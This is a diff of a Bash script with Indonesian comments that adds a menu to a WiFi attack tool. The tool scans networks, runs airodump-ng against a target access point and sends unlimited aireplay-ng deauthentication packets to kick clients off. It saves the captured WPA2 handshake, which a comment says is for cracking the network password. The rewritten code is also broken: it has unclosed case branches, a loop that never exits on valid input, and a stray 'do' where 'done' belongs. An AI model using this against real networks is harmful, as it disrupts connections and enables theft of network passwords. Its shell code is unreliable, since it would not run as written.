@@ -94,58 +94,91 @@ function memindai_jaringan_wifi(){
 }
 
 function menu_alat_handshake(){
-        memindai_jaringan_wifi
-        while true; do
-	read -p "Silahkan masukkan alamat MAC Access Point (BSSID): " b
-	if [[ -z "${b}" ]] || [[ ! "${b}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-    		echo "[-] Alamat MAC Access Point (BSSID) tidak benar. Harap masukkan alamat MAC Access Point (BSSID) yang benar (contoh: XX:XX:XX:XX:XX:XX)."
-	else
-		while true; do
-			read -p "Silahkan masukkan nomor channel yang digunakan oleh Access Point: " c
-			if [[ -z "${c}" ]] || ! [[ "${c}" =~ ^[0-9]+$ ]]; then
-				echo "[-] Nomor channel tidak benar. Harap masukkan nomor channel yang benar."
-			else
-				        # posisi airodump-ng
-				        pa="80x24+0+0"
-				        # posisi aireplay-ng
-				        pg="80x24-0+0"
 
-                             	        # timeout airodump-ng
-                                        tp=28
-				        waktu=$(date +"%Y-%m-%d_%H:%M:%S")
-				        # nama untuk file handshake
-				        nufh="${b}_${waktu}"
-				        echo ""
-				        echo "[*] Menangkap Handshake menggunakan airodump-ng pada antarmuka jaringan ${aj}..."
-				        sleep 3
-		                        xterm -geometry "${pa}" -e "timeout ${tp} airodump-ng --bssid ${b} --channel ${c} --write ${nufh} ${aj}" &
-	                                airodump_pid=$!
-				        sleep 5
-				        # timeout aireplay-ng
-				        ty=20
-				        echo "[*] Mengirimkan paket deauthentikasi menggunakan aireplay-ng pada antarmuka jaringan ${aj}..."
-				        sleep 3
-				        xterm -geometry "${pg}" -e "timeout ${ty} aireplay-ng --deauth 0 -a ${b} ${aj}" &
-				        aireplay_pid=$!
-				        # menunggu proses airodump-ng dan aireplay-ng
-				        wait "${airodump_pid}"
-				        wait "${aireplay_pid}"
-                                        # file handshake yang akan digunakan untuk memecahkan kata sandi jaringan WPA2.'
-                                        fh="${nufh}-01.cap"
-                                        # folder untuk menyimpan file handshake
-                                        ffh="/usr/share/wush-ng/file_handshake/"
-                                        # menghapus semua file csv dan xml
-                                        rm *csv *xml
-                                        mv "${fh}" "${ffh}"
-                                        echo "[+] File Handshake tersimpan di: ${ffh}${fh}."
-                                        sleep 3
-					tekan_enter
-				        break
-			        fi
-		        done
-		        break
-	        fi
-        done
+        while true; do
+                echo "************** Menu Alat Handshake **************"
+		echo ""
+                echo "Pilih opsi dari menu:"
+		echo "--------------"
+                echo "1. Pilih antarmuka jaringan yang lain"
+		echo "2. Aktifkan mode monitor"
+                echo "3. Nonaktifkan mode monitor"
+		echo "--------------"
+                echo "4. Jelajahi target"
+		echo "5. Tangkap Handshake"
+                echo "--------------"
+		echo "6. Kembali ke menu utama"
+                echo "--------------"
+		read -p "[»] " mah
+                case "${mah}" in
+		        1)
+	                        pemilihan_antarmuka_jaringan
+			        tekan_enter
+	                        ;;
+	                2)
+		                mengaktifkan_mode_monitor
+		                tekan_enter
+		                ;;
+		        3)
+	                        menonaktifkan_mode_monitor
+			        tekan_enter
+	                        ;;
+	                4)
+		                memindai_jaringan_wifi
+		                while true; do
+	                                read -p "Silahkan masukkan alamat MAC Access Point (BSSID): " b
+	                                if [[ -z "${b}" ]] || [[ ! "${b}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+    		                                echo "[-] Alamat MAC Access Point (BSSID) tidak benar. Harap masukkan alamat MAC Access Point (BSSID) yang benar (contoh: XX:XX:XX:XX:XX:XX)."
+	                                else
+		                                while true; do
+			                                read -p "Silahkan masukkan nomor channel yang digunakan oleh Access Point: " c
+			                                if [[ -z "${c}" ]] || ! [[ "${c}" =~ ^[0-9]+$ ]]; then
+				                                echo "[-] Nomor channel tidak benar. Harap masukkan nomor channel yang benar."
+				                        fi
+			                        done
+			                        break
+			                fi
+		        5)
+	                        # posisi airodump-ng
+				pa="80x24+0+0"
+				# posisi aireplay-ng
+				pg="80x24-0+0"
+
+                             	# timeout airodump-ng
+                                tp=28
+				waktu=$(date +"%Y-%m-%d_%H:%M:%S")
+				# nama untuk file handshake
+				nufh="${b}_${waktu}"
+				echo ""
+				echo "[*] Menangkap Handshake menggunakan airodump-ng pada antarmuka jaringan ${aj}..."
+				sleep 3
+		                xterm -geometry "${pa}" -e "timeout ${tp} airodump-ng --bssid ${b} --channel ${c} --write ${nufh} ${aj}" &
+	                        airodump_pid=$!
+				sleep 5
+				# timeout aireplay-ng
+				ty=20
+				echo "[*] Mengirimkan paket deauthentikasi menggunakan aireplay-ng pada antarmuka jaringan ${aj}..."
+				sleep 3
+				xterm -geometry "${pg}" -e "timeout ${ty} aireplay-ng --deauth 0 -a ${b} ${aj}" &
+				aireplay_pid=$!
+				# menunggu proses airodump-ng dan aireplay-ng
+				wait "${airodump_pid}"
+				wait "${aireplay_pid}"
+                                # file handshake yang akan digunakan untuk memecahkan kata sandi jaringan WPA2.'
+                                fh="${nufh}-01.cap"
+                                # folder untuk menyimpan file handshake
+                                ffh="/usr/share/wush-ng/file_handshake/"
+                                # menghapus semua file csv dan xml
+                                rm *csv *xml
+                                mv "${fh}" "${ffh}"
+                                echo "[+] File Handshake tersimpan di: ${ffh}${fh}."
+                                sleep 3
+				tekan_enter
+                                ;;
+	        
+                esac
+        do
+        
 }
 
 function mendeskripsi_kata_sandi_jaringan_wpa2(){
